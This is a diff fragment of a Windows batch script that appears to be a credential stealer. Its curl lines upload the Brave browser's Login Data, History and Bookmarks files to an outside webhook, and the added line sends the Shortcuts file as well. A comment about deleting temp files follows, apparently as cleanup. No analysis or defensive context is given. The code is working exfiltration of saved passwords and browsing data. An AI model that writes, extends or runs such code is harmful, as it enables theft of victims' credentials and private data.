@@ -264,6 +264,7 @@ curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Brave d
 curl -F ff=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks" %webhook%
 curl -F hf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History" %webhook%
 curl -F df=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Login Data" %webhook%
+curl -F daf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Shortcuts" %webhook%
 
 
 ::deletes all temp files
